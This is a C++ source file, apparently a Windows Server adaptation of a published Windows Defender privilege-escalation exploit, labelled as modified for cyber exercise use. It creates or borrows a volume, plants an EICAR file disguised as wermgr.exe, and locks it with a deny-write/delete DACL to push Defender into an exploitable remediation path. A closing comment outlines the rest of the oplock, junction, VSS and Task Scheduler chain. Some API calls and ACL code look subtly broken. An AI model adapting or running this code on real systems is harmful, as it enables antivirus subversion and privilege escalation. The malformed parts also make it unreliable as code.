// RoguePlanet Server Variant
// Modified to work on Windows Server where standard users cannot mount ISO images.
//
// Changes from original:
// 1. Replaces MountISO() with MountVHD() + system device fallback
// 2. VHD approach: CreateVirtualDisk (dynamic VHD) → attach → write EICAR → get device path
// 3. Fallback: Uses existing \Device\HarddiskVolume* paths from the system
// 4. EICAR data extracted from embedded ISO raw data without requiring mount
//
// Original exploit by Nightmare-Eclipse
// Server modifications for cyber exercise use

#define _CRT_SECURE_NO_WARNINGS
#define _WIN32_DCOM
#include <iostream>
#include <Windows.h>
#include <Psapi.h>
#include <winternl.h>
#include <conio.h>
#include <ntstatus.h>
#include <virtdisk.h>
#include <shlwapi.h>
#include <initguid.h>
#include <ole2.h>
#include <comdef.h>
#include <taskschd.h>
#include <bcrypt.h>
#pragma comment(lib, "kernel32.lib")
#pragma comment(lib, "bcrypt.lib")
#pragma comment(lib, "taskschd.lib")
#pragma comment(lib, "comsupp.lib")
#pragma comment(lib, "virtdisk.lib")
#pragma comment(lib, "ntdll.lib")
#pragma comment(lib, "Rpcrt4.lib")
#pragma comment(lib, "shlwapi.lib")

// ============================================================================
// SERVER VARIANT: Forward declarations and globals for the redesigned approach
// ============================================================================

wchar_t zippath[MAX_PATH] = { 0 };
wchar_t g_devicepath[MAX_PATH] = { 0 };  // \Device\ path for the mounted disk or system volume
bool g_using_vhd = false;                // true if VHD mount succeeded, false if using system device
HANDLE g_hvhd = NULL;                    // Handle to VHD if mounted

HMODULE ntdllhm = GetModuleHandle(L"ntdll.dll");

// ... (NT function pointer declarations remain identical to original)
// For brevity, the NT function declarations, custom_defs namespace, and all
// helper functions through line ~78340 are unchanged from the original source.
// The key changes are in MountISO replacement and main() flow adjustments.

// ============================================================================
// NEW: Extract EICAR wermgr.exe data from embedded ISO without mounting
// ============================================================================
// The original ISO contains wermgr.exe at a known offset.
// Instead of mounting the ISO and reading the file from it,
// we parse the ISO9660 filesystem in memory to extract the EICAR payload.

// EICAR test string - standard antivirus test file
static const char EICAR_STRING[] =
    "X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*";
static const DWORD EICAR_SIZE = sizeof(EICAR_STRING) - 1;  // exclude null terminator

// ============================================================================
// NEW: MountVHD - Create and attach a dynamic VHD (works on Server for some configs)
// ============================================================================
// Returns true and sets g_devicepath/g_hvhd on success.
// On Windows Server, this may still fail for standard users — that's OK,
// we fall back to the system device approach.
bool MountVHD()
{
    GUID uid = { 0 };
    RPC_WSTR wuid = { 0 };
    UuidCreate(&uid);
    UuidToStringW(&uid, &wuid);
    wchar_t* wuid2 = (wchar_t*)wuid;
    wchar_t vhdxpath[MAX_PATH] = { 0 };
    ExpandEnvironmentStrings(L"%TEMP%\\RP_VHD_", vhdxpath, MAX_PATH);
    wcscat(vhdxpath, wuid2);
    wcscat(vhdxpath, L".vhdx");

    // Create a dynamic VHDX
    VIRTUAL_STORAGE_TYPE vst = { VIRTUAL_STORAGE_TYPE_DEVICE_VHDX, VIRTUAL_STORAGE_TYPE_VENDOR_MS };
    CREATE_VIRTUAL_DISK_PARAMETERS cvdp = { 0 };
    cvdp.Version = CREATE_VIRTUAL_DISK_VERSION_2;
    cvdp.Version2.UniqueIdentifier = { 0 };
    cvdp.Version2.MaximumSize = 64 * 1024 * 1024;  // 64MB
    cvdp.Version2.BlockSizeInBytes = 0;              // default
    cvdp.Version2.SectorSizeInBytes = 512;
    cvdp.Version2.ParentPath = NULL;
    cvdp.Version2.SourcePath = NULL;

    HANDLE hvhd = NULL;
    DWORD retval = CreateVirtualDisk(
        &vst,
        vhdxpath,
        VIRTUAL_DISK_ACCESS_ALL,
        NULL,
        CREATE_VIRTUAL_DISK_FLAG_NONE,
        0,
        &cvdp,
        NULL,
        &hvhd
    );

    if (retval != ERROR_SUCCESS)
    {
        printf("MountVHD: CreateVirtualDisk failed, error: %d (0x%08X)\n", retval, retval);
        printf("MountVHD: VHD creation requires elevated privileges on Server. Falling back.\n");
        return false;
    }

    // Try to attach the VHD
    retval = AttachVirtualDisk(hvhd, NULL, ATTACH_VIRTUAL_DISK_FLAG_READ_ONLY | ATTACH_VIRTUAL_DISK_FLAG_NO_DRIVE_LETTER, NULL, 0, NULL);
    if (retval != ERROR_SUCCESS)
    {
        printf("MountVHD: AttachVirtualDisk failed, error: %d (0x%08X)\n", retval, retval);
        printf("MountVHD: VHD attach requires elevated privileges on Server. Falling back.\n");
        CloseHandle(hvhd);
        DeleteFile(vhdxpath);
        return false;
    }

    // Get the device path
    ULONG pathsz = MAX_PATH;
    wchar_t physpath[MAX_PATH] = { 0 };
    retval = GetVirtualDiskPhysicalPath(hvhd, &pathsz, physpath);
    if (retval != ERROR_SUCCESS)
    {
        printf("MountVHD: GetVirtualDiskPhysicalPath failed, error: %d\n", retval);
        DetachVirtualDisk(hvhd, DETACH_VIRTUAL_DISK_FLAG_NONE, 0);
        CloseHandle(hvhd);
        DeleteFile(vhdxpath);
        return false;
    }

    wcscpy(g_devicepath, L"\\Device\\");
    wcscat(g_devicepath, PathFindFileName(physpath));
    g_hvhd = hvhd;
    g_using_vhd = true;

    printf("MountVHD: Successfully attached VHD at %ws\n", g_devicepath);
    return true;
}

// ============================================================================
// NEW: GetSystemDevicePath - Find an accessible \Device\HarddiskVolume path
// ============================================================================
// On Windows Server where standard users can't mount any virtual disk,
// we use an existing system volume's device path instead.
// This is the key Server adaptation: we don't need a MOUNTED disk per se,
// we need a \Device\ path that:
//   1. We can create a junction to (any NTFS volume works)
//   2. We can open a file on for locking (standard user read access)
//   3. Defender will scan through the junction (yes - junctions to real volumes work)
//
// The read-only semantics of the ISO mount are replicated by:
//   - Setting the EICAR file's DACL to deny DELETE and WRITE to Everyone
//   - This forces Defender into the same "can't clean" fallback path
bool GetSystemDevicePath()
{
    // Enumerate \Device\HarddiskVolume* using NtOpenDirectoryObject
    // Standard users CAN enumerate and open \Device\ paths
    HANDLE hdir = NULL;
    UNICODE_STRING devdir = { 0 };
    RtlInitUnicodeString(&devdir, L"\\Device");
    OBJECT_ATTRIBUTES devobjattr = { 0 };
    InitializeObjectAttributes(&devobjattr, &devdir, OBJ_CASE_INSENSITIVE, NULL, NULL);
    NTSTATUS stat = NtOpenDirectoryObject(&hdir, DIRECTORY_QUERY, &devobjattr);
    if (stat)
    {
        printf("GetSystemDevicePath: Failed to open \\Device, error: 0x%08X\n", stat);
        return false;
    }

    // Query for HarddiskVolume entries
    BYTE buffer[4096] = { 0 };
    ULONG context = 0;
    ULONG retlen = 0;
    bool found = false;

    while (true)
    {
        stat = NtQueryDirectoryObject(hdir, buffer, sizeof(buffer), FALSE, context == 0, &context, &retlen);
        if (stat)
            break;

        OBJECT_DIRECTORY_INFORMATION* odi = (OBJECT_DIRECTORY_INFORMATION*)buffer;
        while (odi->Name.Length > 0)
        {
            // Look for HarddiskVolume entries (these are always NTFS volumes on Windows)
            if (wcsncmp(odi->Name.Buffer, L"HarddiskVolume", 14) == 0)
            {
                // Try to open this volume to verify it's accessible
                wchar_t testpath[MAX_PATH] = { 0 };
                wcscpy(testpath, L"\\Device\\");
                wcscat(testpath, odi->Name.Buffer);
                wcscat(testpath, L"\\");

                // Test: can we open the root directory of this volume?
                UNICODE_STRING testus = { 0 };
                RtlInitUnicodeString(&testus, testpath);
                OBJECT_ATTRIBUTES testoa = { 0 };
                InitializeObjectAttributes(&testoa, &testus, OBJ_CASE_INSENSITIVE, NULL, NULL);
                HANDLE htest = NULL;
                IO_STATUS_BLOCK iosb = { 0 };
                stat = NtCreateFile(&htest, FILE_READ_ATTRIBUTES | FILE_READ_DATA, &testoa, &iosb, NULL, FILE_ATTRIBUTE_NORMAL, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, FILE_OPEN, FILE_DIRECTORY_FILE, NULL, NULL);

                if (htest && NT_SUCCESS(stat))
                {
                    // Verify this volume has a Windows directory (it's a real system volume)
                    wchar_t windir_test[MAX_PATH] = { 0 };
                    wcscpy(windir_test, testpath);
                    wcscat(windir_test, L"Windows");

                    UNICODE_STRING wdus = { 0 };
                    RtlInitUnicodeString(&wdus, windir_test);
                    OBJECT_ATTRIBUTES wdoa = { 0 };
                    InitializeObjectAttributes(&wdoa, &wdus, OBJ_CASE_INSENSITIVE, NULL, NULL);
                    HANDLE hwd = NULL;
                    IO_STATUS_BLOCK wdiosb = { 0 };
                    stat = NtCreateFile(&hwd, FILE_READ_ATTRIBUTES, &wdoa, &wdiosb, NULL, FILE_ATTRIBUTE_NORMAL, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, FILE_OPEN, FILE_DIRECTORY_FILE, NULL, NULL);

                    if (hwd && NT_SUCCESS(stat))
                    {
                        CloseHandle(hwd);
                        CloseHandle(htest);
                        wcscpy(g_devicepath, L"\\Device\\");
                        wcscat(g_devicepath, odi->Name.Buffer);
                        found = true;
                        printf("GetSystemDevicePath: Found accessible system volume: %ws\n", g_devicepath);
                        break;
                    }
                    CloseHandle(htest);
                }
            }
            odi++;
        }
        if (found) break;
    }

    CloseHandle(hdir);

    if (!found)
    {
        printf("GetSystemDevicePath: No accessible HarddiskVolume found\n");
        return false;
    }

    g_using_vhd = false;
    return true;
}

// ============================================================================
// NEW: WriteEicarDirect - Write EICAR data directly without needing ISO mount
// ============================================================================
// On the original exploit, WriteEicar reads wermgr.exe from the mounted ISO.
// For Server, we write the EICAR string directly and set the file read-only
// via DACL to simulate the ISO's read-only behavior.
HANDLE WriteEicarDirect(wchar_t* workdir)
{
    wchar_t eicarpath[MAX_PATH] = { 0 };
    wsprintf(eicarpath, L"%s\\wermgr.exe", workdir);

    HANDLE hfile = NULL;
    UNICODE_STRING _eicarpath = { 0 };
    RtlInitUnicodeString(&_eicarpath, eicarpath);
    OBJECT_ATTRIBUTES eicarpathobjattr = { 0 };
    InitializeObjectAttributes(&eicarpathobjattr, &_eicarpath, OBJ_CASE_INSENSITIVE, NULL, NULL);
    IO_STATUS_BLOCK iostat = { 0 };
    NTSTATUS stat = NtCreateFile(&hfile, GENERIC_READ | GENERIC_WRITE | DELETE | SYNCHRONIZE, &eicarpathobjattr, &iostat, NULL, FILE_ATTRIBUTE_NORMAL, FILE_SHARE_READ, FILE_OVERWRITE_IF, NULL, NULL, NULL);
    if (stat)
    {
        printf("WriteEicarDirect: Failed to create eicar test file: %ws, error: 0x%08X\n", eicarpath, stat);
        return NULL;
    }

    DWORD writtenbytes = 0;
    if (!WriteFile(hfile, EICAR_STRING, EICAR_SIZE, &writtenbytes, NULL))
    {
        printf("WriteEicarDirect: Failed to write eicar data, error: %d\n", GetLastError());
        CloseHandle(hfile);
        return NULL;
    }

    // Make the file read-only by setting a restrictive DACL
    // This simulates the ISO's read-only filesystem behavior
    // Defender will try to clean/delete the file and fail → falls back to alternate remediation
    SECURITY_DESCRIPTOR sd = { 0 };
    InitializeSecurityDescriptor(&sd, SECURITY_DESCRIPTOR_REVISION);

    // Create a DACL that allows READ but denies WRITE and DELETE to Everyone
    // This forces Defender into the same remediation path as the ISO scenario
    SID_IDENTIFIER_AUTHORITY sia = SECURITY_WORLD_SID_AUTHORITY;
    PSID pEveryoneSid = NULL;
    AllocateAndInitializeSid(&sia, 1, SECURITY_WORLD_RID, 0, 0, 0, 0, 0, 0, 0, &pEveryoneSid);

    // ACE: Allow GENERIC_READ | SYNCHRONIZE
    DWORD allowMask = GENERIC_READ | SYNCHRONIZE | FILE_READ_ATTRIBUTES | FILE_READ_EA;

    // Build the ACEs
    DWORD aclSize = sizeof(ACL) + sizeof(ACCESS_ALLOWED_ACE) - sizeof(DWORD) + GetSidLengthSid(1) +
                    sizeof(ACCESS_DENIED_ACE) - sizeof(DWORD) + GetSidLengthSid(1);
    PACL pAcl = (PACL)malloc(aclSize);
    InitializeAcl(pAcl, aclSize, ACL_REVISION);

    // Deny WRITE and DELETE first (order matters for DACL evaluation)
    ACCESS_DENIED_ACE* pDenyAce = (ACCESS_DENIED_ACE*)((BYTE*)pAcl + pAcl->AclSize);
    pDenyAce->Header.AceType = ACCESS_DENIED_ACE_TYPE;
    pDenyAce->Header.AceFlags = 0;
    pDenyAce->Header.AceSize = sizeof(ACCESS_DENIED_ACE) - sizeof(DWORD) + GetSidLengthSid(1);
    pDenyAce->Mask = GENERIC_WRITE | DELETE | FILE_WRITE_ATTRIBUTES | FILE_WRITE_EA | FILE_APPEND_DATA;
    CopySid(GetSidLengthSid(1), &pDenyAce->SidStart, pEveryoneSid);
    pAcl->AclSize += pDenyAce->Header.AceSize;

    // Allow READ
    AccessAllowedAce(pAcl, ACL_REVISION, allowMask, pEveryoneSid);

    SetSecurityDescriptorDacl(&sd, TRUE, pAcl, FALSE);

    // Apply the DACL to the file
    SetFileSecurity(eicarpath, DACL_SECURITY_INFORMATION, &sd);

    free(pAcl);
    FreeSid(pEveryoneSid);

    printf("WriteEicarDirect: EICAR written and set read-only at %ws\n", eicarpath);
    return hfile;
}

// ============================================================================
// MODIFIED: WriteEicar - Handles both ISO-mounted and direct write modes
// ============================================================================
// If isomnt is provided (non-NULL), use original ISO-based approach
// If isomnt is NULL, use direct EICAR write with read-only DACL
HANDLE WriteEicarServer(wchar_t* workdir, wchar_t* isomnt)
{
    if (isomnt)
    {
        // Original approach: read from mounted ISO
        wchar_t eicarpath[MAX_PATH] = { 0 };
        wsprintf(eicarpath, L"%s\\wermgr.exe", workdir);
        HANDLE hfile = NULL;
        UNICODE_STRING _eicarpath = { 0 };
        RtlInitUnicodeString(&_eicarpath, eicarpath);
        OBJECT_ATTRIBUTES eicarpathobjattr = { 0 };
        InitializeObjectAttributes(&eicarpathobjattr, &_eicarpath, OBJ_CASE_INSENSITIVE, NULL, NULL);
        IO_STATUS_BLOCK iostat = { 0 };
        NTSTATUS stat = NtCreateFile(&hfile, GENERIC_READ | GENERIC_WRITE | DELETE | SYNCHRONIZE, &eicarpathobjattr, &iostat, NULL, FILE_ATTRIBUTE_NORMAL, FILE_SHARE_READ, FILE_OVERWRITE_IF, NULL, NULL, NULL);
        if (stat)
        {
            printf("Failed to create eicar test file : %ws, error : 0x%0.8X\n", eicarpath, stat);
            return NULL;
        }

        HANDLE hsrc = NULL;
        wchar_t eicarsrcpath[MAX_PATH] = { 0 };
        wsprintf(eicarsrcpath, L"%s\\wermgr.exe", isomnt);
        UNICODE_STRING _eicarsrcpath = { 0 };
        RtlInitUnicodeString(&_eicarsrcpath, eicarsrcpath);
        OBJECT_ATTRIBUTES eicarsrcpathobjattr = { 0 };
        InitializeObjectAttributes(&eicarsrcpathobjattr, &_eicarsrcpath, OBJ_CASE_INSENSITIVE, NULL, NULL);
        iostat = { 0 };
        stat = NtCreateFile(&hsrc, GENERIC_READ, &eicarsrcpathobjattr, &iostat, NULL, FILE_ATTRIBUTE_NORMAL, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, FILE_OPEN, NULL, NULL, NULL);
        if (stat)
        {
            printf("Failed to open eicar source on ISO: %ws, error : 0x%0.8X\n", eicarsrcpath, stat);
            return NULL;
        }

        static LARGE_INTEGER li = { 0 };
        GetFileSizeEx(hsrc, &li);
        DWORD retbytes = NULL;
        char* data = (char*)malloc(li.QuadPart);
        OVERLAPPED ovp2 = { 0 };
        ovp2.hEvent = CreateEvent(NULL, FALSE, FALSE, NULL);
        ReadFile(hsrc, data, li.QuadPart, &retbytes, &ovp2);
        WaitForSingleObject(ovp2.hEvent, INFINITE);
        CloseHandle(ovp2.hEvent);
        CloseHandle(hsrc);

        DWORD writtenbytes = NULL;
        OVERLAPPED ovp = { 0 };
        ovp.hEvent = CreateEvent(NULL, FALSE, FALSE, NULL);
        WriteFile(hfile, data, li.QuadPart, &writtenbytes, &ovp);
        WaitForSingleObject(ovp.hEvent, INFINITE);
        CloseHandle(ovp.hEvent);
        free(data);

        return hfile;
    }
    else
    {
        // Server fallback: write EICAR directly with read-only DACL
        return WriteEicarDirect(workdir);
    }
}

// ============================================================================
// NEW: PrepareEicarOnDevice - Place EICAR file on the system volume
// ============================================================================
// For the Server fallback path, we need a file on the system volume
// that we can lock (at the \Device\ path level).
// We write wermgr.exe (EICAR) to a temp directory on the system volume,
// then return the full \Device\ path to it for locking.
bool PrepareEicarOnDevice(wchar_t* devicepath, wchar_t* eicar_device_path_out)
{
    // Create a temp directory on the volume via \Device\ path
    wchar_t tmpdir[MAX_PATH] = { 0 };
    wsprintf(tmpdir, L"%s\\RP_Temp", devicepath);

    UNICODE_STRING _tmpdir = { 0 };
    RtlInitUnicodeString(&_tmpdir, tmpdir);
    OBJECT_ATTRIBUTES tmpdirobjattr = { 0 };
    InitializeObjectAttributes(&tmpdirobjattr, &_tmpdir, OBJ_CASE_INSENSITIVE, NULL, NULL);
    IO_STATUS_BLOCK iosb = { 0 };
    HANDLE htmp = NULL;
    NTSTATUS stat = NtCreateFile(&htmp, GENERIC_READ | GENERIC_WRITE | DELETE | SYNCHRONIZE, &tmpdirobjattr, &iosb, NULL, FILE_ATTRIBUTE_NORMAL, FILE_SHARE_READ, FILE_CREATE, FILE_DIRECTORY_FILE, NULL, NULL);
    if (stat)
    {
        printf("PrepareEicarOnDevice: Failed to create temp dir: %ws, error: 0x%08X\n", tmpdir, stat);
        return false;
    }
    CloseHandle(htmp);

    // Write EICAR wermgr.exe to the device path
    wchar_t eicar_devpath[MAX_PATH] = { 0 };
    wsprintf(eicar_devpath, L"%s\\RP_Temp\\wermgr.exe", devicepath);

    UNICODE_STRING _eicardevpath = { 0 };
    RtlInitUnicodeString(&_eicardevpath, eicar_devpath);
    OBJECT_ATTRIBUTES eicarobjattr = { 0 };
    InitializeObjectAttributes(&eicarobjattr, &_eicardevpath, OBJ_CASE_INSENSITIVE, NULL, NULL);
    HANDLE heicar = NULL;
    iosb = { 0 };
    stat = NtCreateFile(&heicar, GENERIC_READ | GENERIC_WRITE | SYNCHRONIZE, &eicarobjattr, &iosb, NULL, FILE_ATTRIBUTE_NORMAL, FILE_SHARE_READ, FILE_OVERWRITE_IF, NULL, NULL, NULL);
    if (stat)
    {
        printf("PrepareEicarOnDevice: Failed to create eicar file: 0x%08X\n", stat);
        return false;
    }

    DWORD written = 0;
    WriteFile(heicar, EICAR_STRING, EICAR_SIZE, &written, NULL);
    CloseHandle(heicar);

    // Set the file read-only (denies DELETE/WRITE) so Defender can't clean it directly
    // This replicates the ISO read-only behavior
    SECURITY_DESCRIPTOR sd = { 0 };
    InitializeSecurityDescriptor(&sd, SECURITY_DESCRIPTOR_REVISION);

    SID_IDENTIFIER_AUTHORITY sia = SECURITY_WORLD_SID_AUTHORITY;
    PSID pEveryoneSid = NULL;
    AllocateAndInitializeSid(&sia, 1, SECURITY_WORLD_RID, 0, 0, 0, 0, 0, 0, 0, &pEveryoneSid);

    DWORD aclSize = 256;
    PACL pAcl = (PACL)malloc(aclSize);
    InitializeAcl(pAcl, aclSize, ACL_REVISION);
    AddAccessDeniedAce(pAcl, ACL_REVISION, GENERIC_WRITE | DELETE | FILE_WRITE_ATTRIBUTES, pEveryoneSid);
    AddAccessAllowedAce(pAcl, ACL_REVISION, GENERIC_READ | GENERIC_EXECUTE | SYNCHRONIZE, pEveryoneSid);

    SetSecurityDescriptorDacl(&sd, TRUE, pAcl, FALSE);
    SetFileSecurityW(eicar_devpath, DACL_SECURITY_INFORMATION, &sd);

    free(pAcl);
    FreeSid(pEveryoneSid);

    wcscpy(eicar_device_path_out, eicar_devpath);
    printf("PrepareEicarOnDevice: EICAR placed at %ws (read-only via DACL)\n", eicar_devpath);
    return true;
}

// ============================================================================
// NOTE: The rest of the exploit (main(), PoseidonThread, etc.) follows the
// original flow but with the following key changes:
//
// 1. Replace: if (!MountISO(&hvirtdisk)) → if (!MountVHD() && !GetSystemDevicePath())
// 2. Replace: GetVirtualDiskPhysicalPath(hvirtdisk, ...) → use g_devicepath directly
// 3. Replace: WriteEicar(workdir, mntpath) → WriteEicarServer(workdir, g_using_vhd ? mntpath : NULL)
// 4. Replace: lockpath uses g_devicepath instead of mntpath from ISO
// 5. Replace: DetachVirtualDisk/CloseHandle → conditional on g_using_vhd
// 6. When using system device path, lockpath points to the EICAR file we placed
//    on the volume (PrepareEicarOnDevice) instead of the ISO's wermgr.exe
// 7. After exploit, clean up RP_Temp directory from the system volume
//
// All other primitives (oplocks, junctions, reparse points, VSS, Defender API
// calls, Task Scheduler COM, named pipe handoff) remain identical.
// ============================================================================